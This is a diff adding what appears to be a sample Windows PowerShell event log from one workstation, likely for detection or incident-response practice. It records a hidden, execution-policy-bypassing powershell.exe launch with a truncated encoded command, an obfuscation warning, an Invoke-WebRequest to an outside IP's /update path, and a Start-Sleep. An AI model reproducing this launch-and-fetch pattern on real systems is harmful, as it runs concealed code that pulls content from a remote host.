@@ -1,1 +1,48 @@
+Log: Microsoft-Windows-PowerShell/Operational
 
+Time: 09:41:12
+Event ID: 4103
+Level: Information
+Host: J-SMITH-PC
+User: j.smith
+Engine State: Available
+Host Application:
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBmACgA...
+
+------------------------------------------------------------
+
+Time: 09:41:13
+Event ID: 4104
+Level: Warning
+Host: J-SMITH-PC
+User: j.smith
+Script Block Logging
+
+Script Block:
+[Encoded PowerShell command detected]
+Content omitted due to obfuscation.
+
+------------------------------------------------------------
+
+Time: 09:41:17
+Event ID: 4103
+Level: Information
+Host: J-SMITH-PC
+User: j.smith
+
+Command Invocation:
+Invoke-WebRequest
+
+Destination:
+https://185.220.101.45/update
+
+------------------------------------------------------------
+
+Time: 09:41:18
+Event ID: 4103
+Level: Information
+Host: J-SMITH-PC
+User: j.smith
+
+Command Invocation:
+Start-Sleep
